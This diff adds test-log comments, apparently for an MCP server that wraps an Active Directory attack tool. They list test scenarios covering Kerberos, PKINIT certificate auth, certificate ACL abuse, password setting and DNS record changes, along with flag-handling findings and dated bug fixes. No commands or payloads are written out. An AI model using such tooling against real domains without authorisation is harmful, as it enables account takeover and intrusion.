+#   S42 (clock skew with ccache), S52 (FAKETIME+Kerberos), S53 (Kerberos write op),
+#   S77 (ccache error handling), S80 (cert enumerate), S81 (cert ACL abuse), S82 (cert get_writable)
+#
+# Auth methods validated:
+#   - NTLM (username/password): S1-S92 (core scenarios)
+#   - Kerberos (ccache): S37, S38, S56, S105-S107, S113-S116
+#   - Certificate (PKINIT): S96-S100, S111
+#   - FAKETIME clock correction: S54, S113-S116
+#   - LDAPS: S69-S70
+#
+# Key findings (2026-04-08):
+#   1. Kerberos auth requires hostname in --host (not IP), use --dc-ip for IP
+#   2. extra_args only supports subcommand-level flags (--raw, --resolve-sd on get)
+#   3. -v DEBUG is a global flag (before subcommand) — cannot pass via extra_args
+#   4. --raw only available on get_object and get_search subcommands
+#   5. Certificate auth works for all operations except set_password (needs NTLM)
+#   6. SRV/MX/TXT DNS lifecycle: add+remove works, but not all types visible in dnsdump
+#
+# Bug fixes applied (2026-04-19):
+#   1. set_password success_check: "password" in out -> rc==0 || "changed successfully" (S16, S43, S70)
+#   2. NoneType crash classification: msldap invalid-creds crash -> error_class=auth (S39)
+#   3. invalidAttributeSyntax classification: unknown -> error_class=params (S47)
+#   4. verify_clock: inherited from BaseMCPServer (MCP_TEST_MODE=1) (S55)
+#
+# Scenario fixes (2026-04-08):
+#   5. S93: --verbose → -v DEBUG; reclassified as known limitation (global flag)
+#   6. S94: --timeout 600 → --raw; reclassified as known limitation (flag not on get_writable)
+#   7. S95: --timeout 30 → --raw; reclassified as known limitation (flag not on add_dnsRecord)
